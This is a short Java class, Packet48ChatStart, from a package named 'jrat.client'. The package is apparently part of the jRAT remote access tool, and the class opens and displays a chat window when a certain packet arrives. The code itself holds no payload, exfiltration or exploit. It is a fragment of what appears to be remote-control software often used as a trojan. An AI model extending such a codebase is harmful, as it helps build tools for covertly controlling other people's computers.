package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.FrameChat;

public class Packet48ChatStart extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		con.setFrameChat(new FrameChat(con));
		con.getFrameChat().setVisible(true);
	}

}
